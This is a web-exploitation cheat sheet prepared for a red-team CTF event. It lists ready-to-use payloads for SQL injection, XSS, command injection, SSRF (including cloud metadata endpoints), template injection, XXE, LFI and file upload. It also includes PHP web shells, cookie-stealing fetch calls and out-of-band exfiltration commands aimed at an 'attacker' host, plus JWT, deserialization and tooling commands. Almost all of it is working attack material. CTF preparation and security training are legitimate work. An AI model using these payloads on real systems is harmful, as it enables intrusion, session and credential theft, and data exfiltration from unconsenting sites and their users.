# Web CTF Cheatsheet — ENKI RedTeam CTF 2026

## 1. SQL Injection

### Detection
```
' OR 1=1-- -
" OR 1=1-- -
' UNION SELECT NULL-- -
1' AND SLEEP(5)-- -
```

### Union-Based
```sql
' UNION SELECT 1,2,3-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT NULL,username,password FROM users-- -
```

### Blind (Boolean)
```sql
' AND 1=1-- -    (true)
' AND 1=2-- -    (false)
' AND SUBSTRING(database(),1,1)='a'-- -
```

### Blind (Time)
```sql
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
'; WAITFOR DELAY '0:0:5'-- -   (MSSQL)
' AND pg_sleep(5)-- -           (PostgreSQL)
```

### Error-Based
```sql
' AND extractvalue(1,concat(0x7e,(SELECT version())))-- -
' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -
```

### Filter Bypass
```sql
/**/UNION/**/SELECT/**/   (space bypass)
UniOn SeLeCt              (case bypass)
0x756E696F6E              (hex encode)
```

### SQLMap
```bash
sqlmap -u "URL?id=1" --batch --dbs
sqlmap -r request.txt --batch --level=5 --risk=3
sqlmap -u URL --tamper=space2comment,between
```

---

## 2. XSS

### Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
"><script>alert(1)</script>
```

### Filter Bypass
```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x onerror=alert`1`>
<svg/onload=alert(1)>
<details open ontoggle=alert(1)>
```

### Cookie Steal
```javascript
fetch('https://attacker/?c='+document.cookie)
new Image().src='https://attacker/?c='+document.cookie
```

---

## 3. Command Injection

### Basic
```
; ls | ls  `ls`  $(ls)  & ls  && ls  || ls
```

### Blind OOB
```bash
; curl http://attacker/$(whoami)
; nslookup $(whoami).attacker.com
```

### Filter Bypass
```bash
{cat,/etc/passwd}           # space bypass
cat${IFS}/etc/passwd        # IFS bypass
c'a't /etc/passwd           # quote bypass
/bin/c?t /etc/passwd        # wildcard bypass
```

---

## 4. SSRF

### Internal
```
http://127.0.0.1/admin  http://localhost/admin  http://[::1]/admin
http://0x7f000001/admin  http://2130706433/admin  http://127.1/
```

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/           (AWS)
http://metadata.google.internal/computeMetadata/v1/ (GCP)
```

### Protocols
```
gopher://  file:///etc/passwd  dict://
```

---

## 5. SSTI

### Detection
```
{{7*7}}=49  ${7*7}=49  <%=7*7%>=49  #{7*7}=49
```

### Jinja2 (Flask)
```
{{config}}
{{config.items()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Twig (PHP)
```
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### Freemarker (Java)
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

---

## 6. XXE

### File Read
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### Blind OOB
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker/evil.dtd">%xxe;]>
```

### PHP Wrapper
```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

---

## 7. LFI / Path Traversal

### Basic
```
../../../etc/passwd
..%2f..%2f..%2fetc/passwd
....//....//....//etc/passwd
```

### PHP Wrappers (LFI to RCE)
```
php://filter/convert.base64-encode/resource=index.php
php://input   (POST body = PHP code)
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==
```

### Log Poisoning
```
1. Inject PHP in User-Agent -> access.log
2. LFI include /var/log/apache2/access.log
```

---

## 8. File Upload

### Extension Bypass
```
shell.php.jpg  shell.pHp  shell.php%00.jpg  shell.php;.jpg
```

### Magic Bytes
```bash
echo -e 'GIF89a\n<?php system($_GET["c"]); ?>' > shell.gif.php
```

### .htaccess
```
AddType application/x-httpd-php .png
```

---

## 9. JWT Attacks

### None Algorithm
```
Header: {"alg":"none","typ":"JWT"} + payload + empty signature
```

### Key Confusion (RS256 -> HS256)
```
Sign with HS256 using the server's RSA public key as HMAC secret
```

### Brute Force
```bash
hashcat -m 16500 jwt.txt wordlist.txt
```

---

## 10. Race Condition

```python
import threading, requests
def race():
    requests.post(URL, data=payload, cookies=c)
threads = [threading.Thread(target=race) for _ in range(50)]
for t in threads: t.start()
```

---

## 11. Auth Bypass
- Default creds: admin:admin, admin:password, root:root
- Host header injection in password reset
- Response manipulation (403->200)
- Direct access to post-2FA page

---

## 12. IDOR
```
GET /api/user/1001 -> /api/user/1002
POST /api/delete {"id": "other_user_id"}
```

---

## 13. HTTP Smuggling

### CL.TE
```
Content-Length: 13 + Transfer-Encoding: chunked
Body: 0\r\n\r\nSMUGGLED
```

---

## 14. Deserialization

### PHP unserialize
```
O:4:"User":1:{s:4:"role";s:5:"admin";}
```

### Java
```bash
ysoserial CommonsCollections1 'id' | base64
```

---

## 15. Prototype Pollution (JS)
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```

---

## 16. GraphQL
```graphql
{__schema{types{name,fields{name}}}}
```

---

## 17. NoSQL Injection (MongoDB)
```
username[$ne]=&password[$ne]=
username=admin&password[$regex]=^a
```

---

## 18. Tools

| Tool | Command |
|------|---------|
| ffuf | `ffuf -u http://T/FUZZ -w wordlist -mc 200,301,302` |
| sqlmap | `sqlmap -r req.txt --batch --level=5 --risk=3` |
| nuclei | `nuclei -u http://T -t cves/ -t vulnerabilities/` |
| gobuster | `gobuster dir -u http://T -w wordlist` |
| nmap | `nmap -sC -sV -p- T` |
| nikto | `nikto -h http://T` |

---

## 19. ENKI RedTeam Tips
- Flag: `ENKI{...}`, scenario: `ENKI{Redteam1-2:...}`
- Multi-stage attack chains expected (separate flag per stage)
- Web shell upload -> internal pivot
- SSRF -> internal service -> additional exploit chain
- Check /robots.txt, /.git/, /.env, /backup, /debug
